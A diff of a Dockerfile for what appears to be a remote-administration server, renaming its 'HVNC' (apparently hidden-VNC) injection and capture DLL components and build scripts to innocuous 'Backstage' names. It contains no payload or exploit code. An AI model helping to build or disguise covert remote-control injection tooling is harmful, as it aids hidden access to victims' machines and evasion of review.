@@ -87,26 +87,26 @@ RUN --mount=type=cache,target=/root/.bun/install/cache \
 COPY Overlord-Server/ ./
 
 # HVNC sources for the cross-compile fallback (used only if no pre-built MSVC DLL).
-COPY HVNCInjection/ ./HVNCInjection/
-COPY build-hvnc-dll.sh ./build-hvnc-dll.sh
-COPY HVNCCapture/ ./HVNCCapture/
-COPY build-hvnc-capture-dll.sh ./build-hvnc-capture-dll.sh
+COPY BackstageInjection/ ./BackstageInjection/
+COPY build-backstage-dll.sh ./build-backstage-dll.sh
+COPY BackstageCapture/ ./BackstageCapture/
+COPY build-backstage-capture-dll.sh ./build-backstage-capture-dll.sh
 
 RUN mkdir -p dist-clients && \
-    if [ -f dist-clients/HVNCInjection.x64.dll ]; then \
-      echo "Using pre-built MSVC HVNCInjection DLL"; \
+    if [ -f dist-clients/BackstageInjection.x64.dll ]; then \
+      echo "Using pre-built MSVC BackstageInjection DLL"; \
     else \
-      chmod +x build-hvnc-dll.sh && \
-      HVNC_SRC_DIR=HVNCInjection/src HVNC_OUT_DIR=dist-clients bash build-hvnc-dll.sh || \
-      echo "WARNING: HVNCInjection DLL not available (build with MSVC on Windows)"; \
+      chmod +x build-backstage-dll.sh && \
+      HVNC_SRC_DIR=BackstageInjection/src HVNC_OUT_DIR=dist-clients bash build-backstage-dll.sh || \
+      echo "WARNING: BackstageInjection DLL not available (build with MSVC on Windows)"; \
     fi
 
-RUN if [ -f dist-clients/HVNCCapture.x64.dll ]; then \
-      echo "Using pre-built MSVC HVNCCapture DLL"; \
+RUN if [ -f dist-clients/BackstageCapture.x64.dll ]; then \
+      echo "Using pre-built MSVC BackstageCapture DLL"; \
     else \
-      chmod +x build-hvnc-capture-dll.sh && \
-      HVNC_CAPTURE_SRC_DIR=HVNCCapture/src HVNC_CAPTURE_OUT_DIR=dist-clients bash build-hvnc-capture-dll.sh || \
-      echo "WARNING: HVNCCapture DLL not available (build with MSVC on Windows)"; \
+      chmod +x build-backstage-capture-dll.sh && \
+      HVNC_CAPTURE_SRC_DIR=BackstageCapture/src HVNC_CAPTURE_OUT_DIR=dist-clients bash build-backstage-capture-dll.sh || \
+      echo "WARNING: BackstageCapture DLL not available (build with MSVC on Windows)"; \
     fi
 
 # Tailwind CSS + vendored frontend assets
